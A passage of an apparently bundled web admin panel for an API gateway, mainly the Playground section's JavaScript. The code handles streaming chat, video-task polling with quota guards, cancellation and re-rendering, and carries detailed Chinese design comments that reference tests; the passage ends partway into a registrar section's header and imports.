nodes.streamMalformed = note;\n      wrap.appendChild(note);\n    }\n    if (turn.errorKey !== null) {\n      wrap.appendChild(elI18n(\"p\", turn.errorKey, { class: \"danger-text pg-error\" }));\n    }\n    // ⚠️ 这一句不是可有可无的客套话，理由见文件头「流式那一轮为什么不显示 token 用量」。\n    wrap.appendChild(elI18n(\"p\", \"pg.turn.noTokens\", { class: \"muted note pg-no-tokens\" }));\n    return wrap;\n  }\n\n  if (turn.errorKey !== null) {\n    wrap.appendChild(elI18n(\"p\", turn.errorKey, { class: \"danger-text pg-error\" }));\n    return wrap;\n  }\n  const text = prettyJson(turn.body);\n  if (text === null) {\n    // 读不出来 ≠ 空响应（全局约束 9 的同型）。\n    wrap.appendChild(elI18n(\"p\", \"pg.turn.unreadable\", { class: \"muted note pg-unreadable\" }));\n    return wrap;\n  }\n  wrap.appendChild(el(\"pre\", { class: \"mono pg-body\" }, text));\n  return wrap;\n}\n\n/** 右栏。 */\nfunction buildRight() {\n  const { wrap, body } = block(\"pg.conv.title\");\n  if (turns.length === 0) {\n    body.appendChild(elI18n(\"p\", \"pg.conv.empty\", { class: \"muted note\" }));\n    return wrap;\n  }\n  for (const turn of turns) body.appendChild(buildTurn(turn));\n  return wrap;\n}\n\n/**\n * 读不出来那一档。**绝不能退化成「画一个空的协议选择器」**：一排空档位会被读成\n * 「这个网关一条协议都没有」，而事实是我们**不知道**它认得哪些协议（全局约束 9 的同型）。\n */\nfunction buildUnavailable() {\n  const wrap = el(\"div\");\n  const banner = el(\"div\", { class: \"banner-danger\", role: \"status\" });\n  banner.appendChild(elI18n(\"span\", \"common.loadFailed\"));\n  const retry = elI18n(\"button\", \"common.refresh\", { type: \"button\", class: \"pg-retry\" });\n  retry.addEventListener(\"click\", () => {\n    // ⚠️ **hint 那一次也要重问**（评审 L3）：`hintAsked` 是个一次性闸，\n    //    `/config` 失败一次之后它永远为真 ⇒ **整个会话的 hint 校验停在「比不了」，\n    //    按了这颗按钮也不恢复**。这颗按钮的语义是「把这个板块读不到的东西再读一次」，\n    //    而 hint 正是其中之一。\n    hintAsked = false;\n    loadHint();\n    loadCatalog(true);\n  });\n  banner.appendChild(retry);\n  wrap.appendChild(banner);\n  const { wrap: card, body } = block(\"pg.req.title\");\n  body.appendChild(elI18n(\"p\", \"pg.unavailable\", { class: \"muted note pg-unknown\" }));\n  wrap.appendChild(card);\n  return wrap;\n}\n\n/**\n * 整个板块重画一遍。**每次都把 body 清空重建**：藏起来的旧内容仍然在无障碍树里、\n * 仍然会被复制粘贴带走。\n */\nfunction render() {\n  const host = nodes.body;\n  host.textContent = \"\";\n  nodes.hintNote = null;\n  nodes.send = null;\n  // **每次重画都作废**：旧那个节点已经从文档里摘掉了，继续往它上面写字等于把\n  // 后半段回答写进一个没人看得见的对象里。`buildTurn()` 会给还在收的那一轮重新挂上。\n  nodes.streamText = null;\n  // 同上，还在收的那一轮那句「掉了几块」（`buildTurn()` 会在 `malformed > 0` 时重新挂上；\n  // 还是 0 的话它本来就不该存在，留成 null 正好）。\n  // ⚠️⚠️ **这一句是有牙的，祸事今天就可达，别照着上面那句 `pollStatus` 的口径读**\n  //    （变异实测：删掉它 ⇒ `tests/ui/dom/playground-section.test.ts` 的\n  //     「连着两轮流式各有坏块：第二轮说的是自己那一句」当场红）：\n  //    第一轮结束时 `.finally()` 会整版重画，而那一轮 `pending` 已经是 false\n  //    ⇒ `buildTurn()` **不再重新挂** ⇒ 少了这一句，它就一直指着第一轮那个已经摘掉的\n  //    节点，于是**第二轮的坏块全写进一个没人看得见的对象里，第二轮屏幕上那句话\n  //    根本不长出来**——正是「静默丢弃就是撒谎」那一条。\n  nodes.streamMalformed = null;\n  // 同上，轮询那一拍要就地重填的那个盒子（`buildMediaResult()` 会重新挂上）。\n  nodes.pollBox = null;\n  // 同上，那一轮的状态码那一格（`buildTurn()` 会重新挂上）。\n  // ⚠️ **这一行是防御性的，今天走不到**（复评 R-1 实测：删掉它 2735 全绿）：\n  //    `render()` 只有两条不重建 `pollTurn` 的早退，而**两条对轮询期间都不成立**——\n  //    ① `catalog === null`：`catalog` 只由 `loadCatalog()` 写，而它的两个入口\n  //       （`onShow()` 与错误横幅那颗重试）都只在 `catalog === null` 时才发得出去，\n  //       轮询进行中 `pollEndpoint()` 正读着它 ⇒ 它不会翻回 null；\n  //    ② `buildRight()` 的 `turns.length === 0`：`turns` 全仓只有 push、零处清空，\n  //       而 `pollTurn` 本身就在里面。\n  //    ⇒ 留着它不是因为它防住过什么，是因为多留一道对称的作废没有代价，\n  //      而少一道的代价要等到有人给 `render()` 加第三条早退时才看得见。\n  nodes.pollStatus = null;\n  if (catalog === null) {\n    host.appendChild(buildUnavailable());\n    return;\n  }\n  const cols = el(\"div\", { class: \"pg-cols\" });\n  cols.appendChild(buildLeft());\n  cols.appendChild(buildRight());\n  host.appendChild(cols);\n}\n\n/**\n * 拉一次协议目录。**成功读过一次就不再读**——目录是静态的，重读一遍只会换来一次\n * 「这次可能失败」的机会（与 `js/sec-models.js` 同一条裁定，理由见那里）。\n *\n * `preempt` 只由错误横幅上那颗「再读一次」传 `true`：显式的用户动作有权抢占一条挂住\n * 的读，隐式的板块切换没有。隐式入口在飞时**只 render() 不发请求**，否则一条永不落地\n * 的读会让此后每一次 `onShow()` 都什么都不画。\n *\n * ⚠️ **「与 `sec-models.js` 同一条裁定」这句话有边界，本轮补写清楚**（评审 F-4）：\n * 同的是上面那两条（读一次就不再读 / 隐式入口不抢占）。**不同的是切走板块那一下**——\n * `sec-models.js` 干脆没有 `onHide()`，一条挂住的读会一直挂到标签页关掉；\n * 这里跟的是 `js/sec-usage.js` 的 `onHide()`（abort + 世代号 `+1`），\n * 理由是 Playground 的 `onHide()` 本来就要作废发送那一次，\n * **一个板块里两条在飞的读一条作废一条不作废，才是那句全称注释变假的来源**。\n * ⚠️ **代价明写**：切走再切回来时目录会**重新读一条**（`sec-models.js` 那边不会）。\n * 那不是「两条链并存」——旧那条已经被 abort 且世代号已作废，它回来什么都改不了；\n * 换来的是一条挂住的读不再把这个板块永久钉在「读不出来」上。\n */\nasync function loadCatalog(preempt) {\n  if (loadInFlight && !preempt) { render(); return; }\n  // 抢占：把上一条的 socket 放掉。**它不是作废判据**，作废判据是下面那个世代号\n  //（与 `js/sec-models.js` 逐字同做法与同一条理由）。\n  if (loadAbort !== null) loadAbort.abort();\n  loadAbort = new AbortController();\n  const signal = loadAbort.signal;\n  const mine = ++loadSeq;\n  loadInFlight = true;\n  try {\n    const body = await api.get(\"/models\", { signal });\n    if (mine !== loadSeq) return;\n    const protocols = playgroundProtocols(body);\n    // **模型清单直接复用模型板块那份窄化**，不在这里再写一遍（`js/sec-settings.js` 同做法）。\n    const models = catalogModels(body);\n    // 媒体端点表（P3d Task 12）。**它读不出来同样是整份读不出来**，不是「媒体档不可用」：\n    // 一个只有对话档能用、另两档静静变空的面板，运维分不出是这个网关不支持媒体、\n    // 还是这份响应我们没读懂（全局约束 9 的同型）。\n    // ⚠️ **代价明写（评审 L3）：媒体那几格漂了，会把整个 Playground（含对话四档）\n    //    一起打死**，右栏变成那条红色横幅。这与 `playgroundProtocols()` / `catalogModels()`\n    //    任何一个读不出来时的处置**逐字一致**（三者同档），**是刻意的一致而不是漏想**：\n    //    「这份响应我们没读懂」时，让一半功能看起来正常才是更坏的那一档。\n    //    真要退化成「媒体档单独不可用」，那是一个新的 UI 状态（第四档），不是把这一行改松。\n    const media = mediaEndpoints(body);\n    catalog = protocols === null || models === null || media === null\n      ? null\n      : { protocols, models, media };\n    if (catalog !== null && protoId === \"\") protoId = catalog.protocols.length > 0 ? catalog.protocols[0].id : \"\";\n  } catch (e) {\n    if (mine !== loadSeq) return;\n    catalog = null;\n  } finally {\n    // 被抢占 / 被作废的那条不许替**新**的那条（或者已经没有了的那条）清标记。\n    if (mine === loadSeq) { loadInFlight = false; loadAbort = null; }\n  }\n  render();\n}\n\n/**\n * 作废目录那条读。**与 `cancelInFlight()` 是两件事，不能合并**（评审 F-4）：\n * `cancelInFlight()` 的作废判据是 `current` 的身份比较，而 `current` **只在 `sendOnce()`\n * 里赋值**——目录那条读用的是另一对模块变量（`loadInFlight` / `loadSeq`），\n * `current` 从来够不着它。合成一个函数的话，那颗「取消」按钮会顺手把目录读也掐了，\n * 而那两件事在 UI 上是分开的（目录读不出来时右栏是横幅，压根没有发送按钮）。\n *\n * ⚠️ **世代号 `+1` 是作废本体，`abort()` 只是省一次真实往返**（本板块四处作废判据同款）：\n * 少了 `+1` 的话，一条晚到的失败仍会走进上面那个 `catch` 把 `catalog` 抹掉。\n * ⚠️ **在这里显式清 `loadInFlight`**：被作废的那条走 `catch` → `mine !== loadSeq` 早退，\n * 它的 `finally` 那一支也不会碰标记 ⇒ 不清的话此后每一次 `onShow()` 都只 render 不发请求。\n */\nfunction cancelCatalogLoad() {\n  if (loadAbort !== null) { loadAbort.abort(); loadAbort = null; }\n  loadSeq++;\n  loadInFlight = false;\n}\n\n/**\n * 问一次设置页那把口令的末几位。\n *\n * ⚠️ **它失败不是错误，只是「比不了」**：`hint` 停在 `null`，那一句显示成\n * 「读不到配置，比不了」而不是「对不上」。把两者折叠成一档会让运维去改一把其实\n * 没错的口令（判定在 `js/pure/playground.mjs` 的 `tokenHintState()`）。\n * ⚠️ **它拿不到、也不该拿到明文口令**：`GET /admin/api/config` 对凭据只回\n * `{ configured, hint }`（设计 §8.6）。\n */\nasync function loadHint() {\n  if (hintAsked) return;\n  hintAsked = true;\n  try {\n    const body = await api.get(\"/config\");\n    hint = credentialView(body, \"gatewayToken\").hint;\n  } catch (e) {\n    hint = null;\n  }\n  if (nodes !== null) syncHintNote();\n}\n\n/** 作废在飞的那一次。**abort 只是省一次真实往返，作废判据是 `current` 的身份比较。** */\nfunction cancelInFlight() {\n  if (current !== null) current.abort();\n  current = null;\n  inFlight = false;\n  /**\n   * ⚠️⚠️ **在飞那一轮的收尾必须在这里做，不能指望 `.finally()`**（评审 F3）。\n   *\n   * `sendOnce()` 的 `.finally()` 第一句是 `if (current !== ctl) return;`，\n   * 而这个函数刚把 `current` 置空 ⇒ **那条收尾路径走不到**。\n   * 非流式那一档看不出来（它的 turn 压根还没进 `turns`），\n   * **流式那一档看得一清二楚**：turn 早就在右栏里了，`pending` 永远停在 `true`\n   * ⇒ 屏幕上留下一个空白框 + 一句「流式不统计 token」，别的什么都不说\n   *（既不说「一个字都没有」，也不说任何错误）。\n   * ⇒ 这里把它收干净，并**明确标成「被取消」**——那与「读完了但没有正文」是两句话。\n   */\n  if (streamingTurn !== null) {\n    streamingTurn.pending = false;\n    streamingTurn.cancelled = true;\n    streamingTurn = null;\n  }\n  /**\n   * ⚠️⚠️ **轮询那一半在这里停，理由与上面那段逐字相同**（护栏 ③，设计 §9.3）：\n   * 定时器不清的话，切走板块 / 按了取消之后**那台打点机还在跑**——每 5 秒一次真的\n   * 上游请求，烧的是运维自己的配额，而屏幕上已经没有任何东西提到这一轮了。\n   * `onHide()` 走的就是这个函数，所以「切走板块停轮询」与「按取消停轮询」是同一份代码。\n   */\n  if (pollTimer !== null) { clearTimeout(pollTimer); pollTimer = null; }\n  if (pollTurn !== null) {\n    pollTurn.pending = false;\n    pollTurn.cancelled = true;\n    pollTurn.pollState = \"stopped\";\n    pollTurn = null;\n    pollCtl = null;\n  }\n}\n\n/**\n * 轮询收尾。**每一条出口都要走它**——它是「把 `pending` 收干净 + 松开在飞标记」\n * 唯一的地方，散在各条分支里写就会漏掉某一条（流式那一档正是这么栽的）。\n */\nfunction finishPolling(state) {\n  if (pollTimer !== null) { clearTimeout(pollTimer); pollTimer = null; }\n  if (pollTurn !== null) {\n    pollTurn.pollState = state;\n    pollTurn.pending = false;\n  }\n  pollTurn = null;\n  pollCtl = null;\n  current = null;\n  inFlight = false;\n  render();\n}\n\n/**\n * 排下一次打点。**三条护栏里的第 ① 与第 ② 条都在这里。**\n *\n * ⚠️ **`videoPollNext()` 判上限，本函数不自己数**（判定在纯函数里，admin-ui/README.md\n * 硬规则 1）：写在这里的话它就没有单测，而「轮询会不会停」在屏幕上要几分钟才看得出来。\n * ⚠️ **页面藏起来时直接返回、不排定时器**（照抄 `js/sec-events.js` 的 `scheduleNext()`）：\n * 一个被切到后台的标签页不该继续烧配额。变回可见时由下面那个模块级监听接回去。\n */\nfunction schedulePoll() {\n  if (pollTimer !== null) { clearTimeout(pollTimer); pollTimer = null; }\n  if (pollTurn === null) return;\n  if (document.hidden) return;\n  const step = videoPollNext({ attempt: pollTurn.pollAttempt, elapsedMs: Date.now() - pollStartedAt });\n  if (step.action === \"giveUp\") { finishPolling(\"gaveUp\"); return; }\n  pollTimer = setTimeout(() => { pollOnce(); }, step.delayMs);\n}\n\n/**\n * 页面从隐藏变回可见时，把因为它而停掉的那台打点机接回去\n * （**只注册一次的模块级监听**，与 `js/sec-events.js` 同一做法与同一理由）。\n *\n * ⚠️ **判据是「这一轮还在轮而且没有定时器在排」**，不是「本板块正在显示」：\n * 切走板块已经由 `onHide()` → `cancelInFlight()` 把 `pollTurn` 清空了，\n * 所以这里不需要再问一次板块活没活着——问了反而多一份会漂的状态。\n */\ndocument.addEventListener(\"visibilitychange\", () => {\n  if (!document.hidden && pollTurn !== null && pollTimer === null) schedulePoll();\n});\n\n/**\n * 打一次点。**每一次都是一次真的上游请求**（全局约束 14 的护栏管的正是它）。\n *\n * ⚠️ **停下来的判据是「这次响应里出现了媒体地址」，不是某个 status 字段等于某个词。**\n * 上游那份状态词表**本仓从来没有核实过**（`src/http/routes/media.ts` 的文件头只承诺\n * 原样转发），编一张出来的后果是：换一个上游实现，面板会一直轮到上限，\n * 而那条成片其实第二次打点就回来了。\n * ⚠️ **一次失败就停，并且说出来**：接着轮的话，那条错误要么被下一次覆盖掉（运维永远\n * 看不见它），要么和「还在轮」同时画出来（两句话互相矛盾）。停下来之后任务标识还摆着，\n * 稍后可以自己再查。\n */\nasync function pollOnce() {\n  pollTimer = null;\n  const turn = pollTurn;\n  const ctl = pollCtl;\n  // **身份比较**，与本板块其余三处作废判据是同一条（文件头那段 ⚠️⚠️）。\n  if (turn === null || ctl === null || current !== ctl) return;\n  const req = buildPollRequest(pollEndpoint(), turn.taskId, origin);\n  if (req === null) {\n    turn.errorKey = \"pg.err.buildFailed\";\n    finishPolling(\"stopped\");\n    return;\n  }\n  turn.pollAttempt++;\n  try {\n    const r = await sendToGateway(req, token, { origin, signal: ctl.signal });\n    if (current !== ctl) return;\n    turn.status = r.status;\n    turn.body = r.body;\n    turn.contentType = typeof r.contentType === \"string\" ? r.contentType : \"\";\n    if (mediaResultUrls(turn.body).length > 0) { finishPolling(\"done\"); return; }\n    /**\n     * ⚠️⚠️ **这一拍只重填正在轮的那一个盒子，不整版 `render()`**（P3d 全分支评审 F-2）。\n     *\n     * 上一版这里是 `render()`，而 `render()` 会把**全部历史轮次**从头重建：\n     * 每一轮的媒体档都要走一次 `mediaResultUrls(turn.body)`（整棵 JSON 树）\n     * 再加一次 `prettyJson(turn.body)`（整份 `JSON.stringify`，**无长度上限**）。\n     * 单看它便宜——**它与另外两件事相乘才有牙**：\n     * ① Task 12 让 `turn.body` 可能是一张 base64 图（`mediaEmbeddable()` 放行\n     *    `^data:image/`，1024×1024 那一档 ≈ 1.5 MB/轮）；\n     * ② 视频轮询最多 60 拍（`VIDEO_POLL_MAX_ATTEMPTS`），**每拍一次**。\n     * 实测（`npx tsx` 只 import 仓里的真函数、喂 1.5 MB base64 × N 轮）：\n     * 一次整版重建在 1 / 5 / 10 轮时是 3.0 / 15.0 / **30.0 MB** 临时字符串，\n     * ⇒ `turns=10` 时一次视频任务累计 **≈ 1.8 GB**、主线程占用按机器快慢在 1.5–29 s 之间。\n     *\n     * **这一拍在屏幕上会变的东西是三样**：`pollAttempt` 那句话、这一轮的响应原文，\n     * 以及**这一轮的状态码**。前两样在那个盒子里，**第三样不在**——它由 `buildTurn()`\n     * 画在 `foot` 上（那个 `.pg-status`）。所以下面**两处都要动**。\n     * ⚠️⚠️ **上一版这里只重填了盒子，并且写着「唯一会变的只有两样……输出逐字相同」\n     *    ——那是一句假话，复评 M-4 逐节点 diff 当场证伪**：轮询回 500 时屏幕上那一格\n     *    还是上一拍的 200，而同屏的响应原文已经是 `{\"error\":…}` 了，\n     *    **两句话互相矛盾，而前一句是编的**，最长挂到轮询结束（上限 5 分钟）。\n     * ⇒ 现在的说法是可核的那一句：**这一拍就地改的两处，与整版重建的输出逐字相同**，\n     *   而代价从 O(全部轮次 × 每轮 body) 降到 O(这一轮 body)，与历史轮数无关。\n     * ⚠️ **仍然走同一份 `fillMediaResult()`**，不是在这里另写一套「只改那个数字」的\n     * 就地更新——那会是第二套渲染判据，两套一漂只有真机上看得见。\n     * （状态码那一格是一个 `textContent`，不是第二套判据：它与 `buildTurn()` 里那句\n     * `String(turn.status)` 逐字同源，而「同不同源」由下面那格等价断言直接钉着。）\n     * ⚠️ **终局那三条出口照旧整版 `render()`**（`finishPolling()` 里那一次）：\n     * 成片/放弃/出错时整轮的形状都变了，那一次重建是必要的，而且一次任务只有一次。\n     *\n     * **三格一起钉着，方向各不相同**：\n     * ① `tests/ui/dom/playground-section.test.ts` 的\n     *    「轮询那一拍不整版重画 —— 右栏别的轮次必须还是原来那几个节点对象」——省下来的那件事；\n     * ② `tests/ui/dom/playground-section.test.ts` 的\n     *    「轮询回非 2xx 时状态码那一格显示的是这一拍的数字 —— 屏幕不许贴着错误正文说 200」\n     *    ——上面那条回归本身；\n     * ③ `tests/ui/dom/playground-section.test.ts` 的\n     *    「就地重填与整版重建输出逐字相同（六场景逐节点逐属性）」——等价性本身。\n     */\n    if (nodes.pollStatus !== null) nodes.pollStatus.textContent = String(turn.status);\n    if (nodes.pollBox !== null) {\n      nodes.pollBox.textContent = \"\";\n      fillMediaResult(nodes.pollBox, turn);\n    }\n    schedulePoll();\n  } catch (e) {\n    if (current !== ctl) return;\n    const code = e && e.code;\n    turn.errorKey = code === \"cross_origin\" ? \"pg.err.crossOrigin\" : \"pg.err.transport\";\n    finishPolling(\"stopped\");\n  }\n}\n\n/**\n * 建任务那一轮回来之后，要不要接着轮。**返回 true 表示这一轮还没完**\n * ——调用方据它决定**不要**松开在飞标记（全局约束 14：轮询的每一次打点同样烧配额）。\n *\n * 四种「不用轮」各自有自己的出口，**都不是静默的**：不是视频档 / 这次就失败了 /\n * 目录里没有轮询端点 / 上游一次就把成片给了 / 响应里没有能当任务标识用的那一格。\n */\nfunction startPolling(turn, ctl) {\n  if (turn.mode !== \"video\" || turn.errorKey !== null || turn.status === null) return false;\n  if (pollEndpoint() === null) return false;\n  if (mediaResultUrls(turn.body).length > 0) return false;\n  const id = videoTaskIdOf(turn.body);\n  if (id === null) { turn.pollState = \"noTaskId\"; return false; }\n  turn.taskId = id;\n  turn.pollState = \"polling\";\n  turn.pending = true;\n  pollTurn = turn;\n  pollCtl = ctl;\n  pollStartedAt = Date.now();\n  schedulePoll();\n  return true;\n}\n\n/**\n * 按一下发送。**这是全站第二颗会真打上游的按钮**，护栏见文件头。\n *\n * ⚠️ **拦截分档在这里、不在 `buildRequest()` 里**：把「没填口令」塞进纯函数的话，\n * 它会和「构造不出请求」一起变成同一个 `null`，而这两件事在 UI 上必须分得开。\n */\nfunction sendOnce() {\n  // ⚠️⚠️ **在飞去重那一道住在 `sendBlockedKey()` 的第一档里，不在这里。**\n  //    这一版曾经在这行上面多写过一句 `if (inFlight) return;`，而**变异实测把它删掉\n  //    ⇒ 22/22 全绿**——它是一句没有任何用例守着的冗余，因为 `sendBlockedKey()`\n  //    的第一句判的就是 `inFlight`。当时文件头正声称那句话是护栏本体，\n  //    **那是一句假断言**，连同这段一起改真了。\n  //    ⇒ **判据只许有一份**：要改在飞去重，改 `sendBlockedKey()` 那一档。\n  if (sendBlockedKey() !== null) return;\n  const proto = currentProto();\n  const target = currentTarget();\n  // **媒体那两条端点没有流式形态**，所以流式只在对话档才可能为真\n  //（左栏在媒体档下压根不画那个开关，这里是第二道：开关的状态活过一次换档）。\n  const stream = mode === \"chat\" && streamOn === true;\n  const req = buildRequest(target, { model: modelId, prompt: promptText, stream, origin });\n  if (req === null) {\n    turns.push({\n      promptText, url: \"\", method: \"\", status: null, body: null, errorKey: \"pg.err.buildFailed\",\n      stream: false, streamed: false, text: \"\", malformed: 0, pending: false, cancelled: false,\n      mode, contentType: \"\", taskId: null, pollState: null, pollAttempt: 0,\n    });\n    render();\n    return;\n  }\n  const ctl = new AbortController();\n  current = ctl;\n  inFlight = true;\n  const sent = promptText;\n\n  /**\n   * 这一轮。**流式那一档在请求发出去之前就进 `turns`**，因为它要一边收一边画；\n   * 非流式那一档仍然是回来之后才进（它在中途没有任何可画的东西）。\n   */\n  const turn = {\n    promptText: sent, url: req.url, method: req.method, status: null, body: null, errorKey: null,\n    stream, streamed: stream, text: \"\", malformed: 0, pending: stream, cancelled: false,\n    mode, contentType: \"\", taskId: null, pollState: null, pollAttempt: 0,\n  };\n  if (stream) {\n    turns.push(turn);\n    streamingTurn = turn;\n  }\n  render();\n\n  const done = (r) => {\n    turn.status = r.status;\n    turn.body = r.body;\n    // 流式那条路不带这一格（它读的是 SSE，不是一份响应体）⇒ 空串。\n    turn.contentType = typeof r.contentType === \"string\" ? r.contentType : \"\";\n    turn.streamed = r.streamed === true;\n    if (!stream) turns.push(turn);\n  };\n  const failed = (e) => {\n    // **只认档位名，不把 `e.message` 画出去**：那条串是本地拼的，别给它机会带上\n    // 任何一段请求内容（全局约束 11(b)）。\n    const code = e && e.code;\n    turn.errorKey = code === \"cross_origin\"\n      ? \"pg.err.crossOrigin\"\n      : code === \"stream_error\" ? \"pg.err.stream\" : \"pg.err.transport\";\n    // ⚠️ **流式中途断掉时那一轮已经在 `turns` 里了，不许再 push 一次** ——\n    //    再 push 一次的话，运维会看到同一轮出现两遍，其中一遍带着半截正文。\n    if (!stream) turns.push(turn);\n  };\n\n  const run = stream\n    ? streamFromGateway(req, token, {\n      origin,\n      signal: ctl.signal,\n      onPayload: (payload) => {\n        // ⚠️ **取消之后就不许再往里写**：`current !== ctl` 是本板块统一的作废判据\n        //    （文件头那段 ⚠️⚠️：abort 本身在测试里不可观测，被钉住的是这个比较）。\n        //    少了这一句，一条已经被取消的流会继续把字写进右栏。\n        if (current !== ctl) return;\n        // **正文在哪一格来自协议目录**，本文件不认识任何一个协议 id（全局约束 15）。\n        const piece = deltaText(proto, payload);\n        if (piece === null) {\n          // 读不出来的一块。**数出来、显示出来，但不中断整轮**：\n          // 一块坏数据不该让运维正在读的那段回答整个消失。\n          turn.malformed++;\n          /**\n           * ⚠️⚠️ **「显示出来」必须现在就发生，不能等到流结束**（复评 G2 实测）：\n           * 这个数画在那个 `<pre>` **外面**，而下面那句就地更新只碰 `<pre>` 的\n           * `textContent` ⇒ 上一版在途期间屏幕上**一个字都不提**，\n           * 把一段缺字的回答当成完整的回答画着，直到 `.finally()` 那一次整版\n           * `render()` 才补上（长生成是分钟级，流被挂住时无限期）。\n           * 与 `.pg-status` 那一次是同一个结构性 bug，只是换到了流式这条路。\n           *\n           * **两档，判据只有一份**：\n           * · 那一行已经在屏幕上 ⇒ 就地改 `textContent`，**串本身与 `buildTurn()` 里\n           *   那句 `t(\"pg.turn.malformed\", …)` 逐字同源**（不是第二套判据）；\n           * · `0 → 1` 那一下它还不存在 ⇒ **整版重建一次**，因为「它插在哪一行之前」\n           *   是 `buildTurn()` 的判据，在这里另写一套插入位置就是第二套渲染判据，\n           *   两套一漂只有真机上看得见。这一档**一轮最多发生一次**（此后 `malformed`\n           *   恒 > 0，那一行一直在），代价与「一秒几十块都重画」不同阶。\n           *\n           * **三格钉着，方向各不相同**：\n           * ① `tests/ui/dom/playground-section.test.ts` 的\n           *    「不是等流结束那一次整版重画才补上」——在途那一拍屏幕上必须有这一行本身；\n           * ② `tests/ui/dom/playground-section.test.ts` 的\n           *    「场景⑦流式在途：就地写字与整版重建输出逐字相同（逐节点逐属性）」\n           *    ——等价性本身，与轮询那六格共用同一份装置；\n           * ③ `tests/ui/dom/playground-section.test.ts` 的\n           *    「连着两轮流式各有坏块：第二轮说的是自己那一句」\n           *    ——`render()` 里那句作废，少了它第二轮的坏块会写进上一轮那个摘掉的节点。\n           */\n          if (nodes.streamMalformed !== null) {\n            nodes.streamMalformed.textContent = t(\"pg.turn.malformed\", { count: String(turn.malformed) });\n          } else {\n            render();\n          }\n          return;\n        }\n        if (piece === \"\") return;\n        turn.text += piece;\n        // 就地改文字，不整块重画（重画会让左栏输入框丢焦点）。\n        if (nodes.streamText !== null) nodes.streamText.textContent = turn.text;\n      },\n    })\n    : sendToGateway(req, token, { origin, signal: ctl.signal });\n\n  run\n    .then((r) => { if (current === ctl) done(r); })\n    .catch((e) => { if (current === ctl) failed(e); })\n    .finally(() => {\n      // 被取消过的话这里早退 —— 收尾已经由 `cancelInFlight()` 做完了（见那里的 ⚠️⚠️）。\n      if (current !== ctl) return;\n      // ⚠️ **视频那一档：建任务只是第一段，这一轮还没完。**\n      //    在飞标记与取消令牌都留着不动，理由见文件头「轮询期间在飞标记不松开」。\n      if (startPolling(turn, ctl)) { render(); return; }\n      current = null;\n      inFlight = false;\n      turn.pending = false;\n      streamingTurn = null;\n      render();\n    });\n}\n\nexport const playgroundSection = {\n  init(section) {\n    section.textContent = \"\";\n    section.appendChild(elI18n(\"h2\", \"pg.title\"));\n    section.appendChild(elI18n(\"p\", \"pg.desc\", { class: \"muted note\" }));\n    section.appendChild(elI18n(\"p\", \"pg.runtimeNote\", { class: \"muted note\" }));\n    const body = el(\"div\");\n    section.appendChild(body);\n    nodes = {\n      body, hintNote: null, send: null,\n      streamText: null, streamMalformed: null,\n      pollBox: null, pollStatus: null,\n    };\n    // 判定在纯函数里，而那个目录下拿不到浏览器的顶层全局，所以在这里读一次传进去。\n    origin = location.origin;\n    token = readGatewayToken();\n  },\n\n  onShow() {\n    // ⚠️⚠️ **每次显示都重新从存储读一遍口令，不能只在 `init()` 里读一次**\n    //（评审 M2）：登出**不会** reload 页面、板块也不会重新 `init()`，\n    //    于是模块变量里那把口令会活过一次登出 ⇒ 下一个人登录进来时口令框是预填好的。\n    //    `js/app.js` 的 `leave()` 清存储、这里重新读存储，**两处缺一不可**。\n    // ⚠️ **代价明写**：隐私模式下 `writeGatewayToken()` 写不进去，于是切走再切回来\n    //    会丢掉刚粘的那把——与那条「刷新后要重新粘」是同一档代价，不是新增的。\n    token = readGatewayToken();\n    loadHint();\n    if (catalog !== null) { render(); return; }\n    loadCatalog(false);\n  },\n\n  onHide() {\n    // 切走板块 = 作废在飞的那**两**条（全局约束 14 的护栏之一）。\n    // ⚠️⚠️ **上一版这里只有 `cancelInFlight()`，而注释写的是「作废在飞的那一次」**\n    //    ——一句全称句，而目录那一次不在其中（评审 F-4，实测）：`cancelInFlight()`\n    //    只动 `current`，`current` 只在 `sendOnce()` 里赋值。⇒ 两条各自的作废器都要调。\n    cancelInFlight();\n    cancelCatalogLoad();\n  },\n};\n", type: "text/javascript; charset=utf-8", etag: "\"9992b02d123cc9ce\"" },
  "/admin/js/sec-registrar.js": { body: "/**\n * 注册机板块（设计 §10.3）：状态 → 池子四格 → **两张完全平级的通道卡** → 补池历史。\n * 「立即补池」那颗按钮的四条护栏在后端（`src/http/admin/handlers/registrar.ts`），\n * 第 3 条（确认弹窗明示消耗）在这里。\n *\n * 板块契约（设计文档 §9.3）：`{ init?, onShow?, onHide? }`，见 admin-ui/js/app.js\n * 的 showSection。**板块内不许监听 langchange**——框架层会 apply(document) 之后\n * 重跑一次 onShow()。\n *\n * 三条纪律：\n * ① 一切来自接口的内容一律 textContent（补池历史里的 `channel` 是配置来的字符串、\n *    `reason` 可能是这个面板版本不认识的值，两者都会被原样显示）；\n * ② **取值决策一律不写在这里**，全在 `js/pure/registrar.mjs` 里，由\n *    `tests/ui/registrar.test.ts` 的\n *    「第 3 条：通道顺序恒为 moemail, yyds（字母序，唯一可辩护的中立规则）」\n *    那一族跑着（admin-ui/README.md 硬规则 1）；\n * ③ **没有自动刷新。** 这个板块每刷新一次要付 3 次存储读（补池历史 + 补池锁 +\n *    护栏键），而配额账把面板的读算成「人点一下才发生」。要加轮询之前先去看\n *    计划「配额账」一节的红线。\n *\n * ⚠️ **两张通道卡由同一个 `buildChannelCard()` 建出来，这不是省代码。**\n * 设计 §10.3 第 2 条要求「两张卡片布局完全对称：同字段数、同控件类型」，\n * 而两段各写各的代码迟早会分叉（一边多一行说明、一边少一颗按钮）。\n * 从同一个函数建出来时，**不对称在结构上就是不可表达的**——除非有人专门给它\n * 加一个 `if (channel === …)`，而那一行在评审里看得见。\n * `tests/ui/dom/registrar-section.test.ts` 的\n * 「两张通道卡同字段数、同控件类型、同顺序 —— 加一行说明就变红」正面钉着它。\n */\nimport { api } from \"./api.js\";\nimport { t } from \"./i18n.js\";\nimport { el, elI18n, toast, openModal } from \"./ui.js\";\nimport { fmtCount, fmtDash, fmtDuration, fmtInstant } from \"./pure/format.mjs\";\nimport { offsetMs } from \"./pure/overview.mjs\";\nimport {\n  CHANNELS, channelLabelKey, channelAddressFactKey, channelRoleKey,\n  statusView, channelCards, poolView, tendCost, manualQuotaView,\n  historyRows, historyMalformed, roundOutcome, roundFailures, mintedByChannelText,\n  channelTestResult, refuseKeyOf,\n} from \"./pure/registrar.mjs\";\n\nlet nodes = null;\nlet abort = null;\n/** 最近一次成功的 `/registrar/status` 响应；`null` = 还没有过一次成功。 */\nlet data = null;\n\n/** 「标签: 值」一行。与概览板块同一个原语，值由调用方之后自己 textContent。 */\nfunction row(labelKey) {\n  const p = el(\"p\");\n  p.appendChild(el(\"span\", { class: \"muted\" }, `${t(labelKey)}: 